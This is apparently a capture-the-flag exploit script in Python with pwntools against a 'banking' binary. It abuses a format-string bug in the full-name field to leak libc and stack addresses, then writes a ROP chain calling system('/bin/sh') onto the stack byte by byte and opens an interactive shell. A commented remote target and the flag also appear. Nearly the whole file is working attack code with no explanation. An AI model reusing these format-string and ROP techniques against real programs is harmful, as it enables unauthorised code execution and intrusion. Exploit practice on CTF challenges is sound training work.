#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('banking')
libc = ELF('libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def reg(name, pw, fullname):
    sla(b'>', b'2')
    sla(b'name', name)
    sla(b'word', pw)
    sla(b'name', fullname)
    sla(b'>', b'1')
    sla(b'name', name)
    sla(b'word', pw)
def info():
    sla(b'>', b'3')
def logout():
    sla(b'>', b'4')
def gen_fmstr(addr, value):
    payload = b''
    if addr & 0xffff != 0:
        payload += b'%' + str(addr & 0xffff).encode() + b'c'
    payload += b'%13$hn'
    tmp = addr & 0xff
    if tmp > value:
        need = value + 0x100 - tmp
    else:
        need = value - tmp
    payload += b'%' + str(need).encode() + b'c' + b'%40$lln'
    return payload
def fmstr(offset, value):
    if value != 0:
        payload = f'%{value}c%{offset}$hn'.encode()
    else:
        payload = b'hihi'
    return payload
def GDB(proc):
    gdb.attach(p, gdbscript='''
               b info
               b *(main + 84)
               c
               ''')
#context.log_level = 'debug'
p = process()
#p = remote('103.163.24.78', 10002)
reg(b'nao', b'nao', b'%p|'*0x10)
info()
ru(b'|')
leak = ru(b'|')[:-1]
leak = int(leak.decode(), 16)
print('leak: ', hex(leak))
libc.address = leak - 0x1f6b24
print('libc: ', hex(libc.address))
for i in range(3):
    ru(b'|')
leak = ru(b'|')[:-1]
leak = int(leak.decode(), 16)
print('leak: ', hex(leak))
stack_main = leak + 0x28
print('stack: ', hex(stack_main))

GDB(p)

logout()
sla(B'eedback:', b'hihi')
reg(b'nao', b'nao', b'%13$p|%40$p')
info()
RET = 0x00000000000b9ba9 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
rop.raw(RET)
rop.system(next(libc.search(b'/bin/sh\x00')))
rop = rop.chain()
print(rop)
for i in range(len(rop)):
    logout()
    sla(B'eedback:', b'hihi')
    pl = fmstr(13, stack_main & 0xffff)
    reg(b'nao', b'nao', pl)
    info()
    logout()
    sla(B'eedback:', b'hihi')
    pl = fmstr(40, rop[i])
    reg(b'nao', b'nao', pl)
    info()
    stack_main += 1
logout()
sl(b'hihi')
sla(b'>', b'3')

#KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}


p.interactive()